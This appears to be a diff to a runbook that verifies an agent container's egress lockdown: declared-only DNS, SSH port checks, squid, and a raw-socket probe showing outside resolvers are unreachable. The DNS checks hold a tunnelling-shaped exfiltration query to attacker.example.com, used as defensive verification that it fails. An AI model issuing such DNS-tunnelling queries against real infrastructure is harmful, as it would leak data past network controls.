@@ -405,9 +405,22 @@ ssh -T -o ConnectTimeout=10 -p 443 git@github.com; echo "other-port=$?"
 
 **Expected**: the declared pair succeeds (`ssh -T git@github.com` prints GitHub's greeting and exits
 1 — that is a *successful* connection, so read the message, not the code); the other host fails to
-**resolve** (undeclared names are REFUSED by the sidecar resolver); the other port **times out**,
-because `github.com` resolves — a ported entry is in the DNS allowlist too — but nothing permits
-443 to it. That host and that port, not the protocol generally.
+**resolve** (undeclared names are REFUSED by the sidecar resolver); and the other port is
+**CLOSED, not timed out** — measured:
+
+```
+kex_exchange_identification: Connection closed by remote host
+Connection closed by 140.82.121.4 port 443
+```
+
+`github.com` resolves (a ported entry is in the DNS allowlist too), and 443 is REDIRECTed into
+squid, which has no declared SNI for an SSH handshake and terminates it. So the failure arrives
+*promptly and named*, rather than as the hang an earlier version of this step predicted. That host
+and that port, not the protocol generally.
+
+Distinguishing the two matters operationally: a timeout would suggest a dropped packet — a
+netfilter or routing problem — while a closed connection identifies the proxy as the component that
+refused, which is where to look.
 
 > **Caution while T147 is open**: `iptables -d github.com` resolves and *pins* the addresses at
 > rule-install time. If this step fails for the declared pair after a previously-working deploy,
@@ -419,12 +432,31 @@ because `github.com` resolves — a ported entry is in the DNS allowlist too —
 getent hosts api.anthropic.com          # declared  -> resolves
 getent hosts api.openai.com             # undeclared -> does not
 getent hosts ZXhmaWx0cmF0ZWQ.attacker.example.com   # tunnelling-shaped -> does not
-dig +time=5 +tries=1 @8.8.8.8 attacker.example.com  # cannot be asked at all
 agent-container logs dev --egress | grep -i refused  # the refusals are a RECORD
 ```
 
-**Expected**: only the declared name resolves. **`dig @8.8.8.8` does not return Google's answer and
-is not silently answered by ours either — it fails to connect** ("no servers could be reached").
+**`dig` and `nc` are deliberately NOT used here**: neither is in the agent image, and agents must
+never `apt install` at runtime, so a step calling them cannot be executed as written. To check that
+an outside resolver is unreachable, use a raw socket — no package required:
+
+```bash
+python3 - <<'EOF'
+import socket
+q = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' \
+    b'\x07example\x03com\x00\x00\x01\x00\x01'
+for server in ("8.8.8.8", "1.1.1.1", "127.0.0.1"):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(5)
+    try:
+        s.sendto(q, (server, 53)); s.recvfrom(512); print(server, "ANSWERED")
+    except Exception as exc:
+        print(server, "unreachable:", type(exc).__name__, exc)
+EOF
+```
+
+**Expected**: only the declared name resolves. **8.8.8.8 and 1.1.1.1 are unreachable** — measured as
+`Operation not permitted`, i.e. the send itself is refused by the default-deny policy, not a lost
+reply. `127.0.0.1` answers, and answers with RCODE 5 (REFUSED) for an undeclared name rather than
+NXDOMAIN.
 That is the design, not a defect: FR-020a is met by **dropping** port 53 rather than redirecting it
 (research R18, measured). A REDIRECT would *answer* an agent that asked Google, substituting our
 resolver behind its back; the DROP means every resolver except ours is **unreachable**, so it cannot
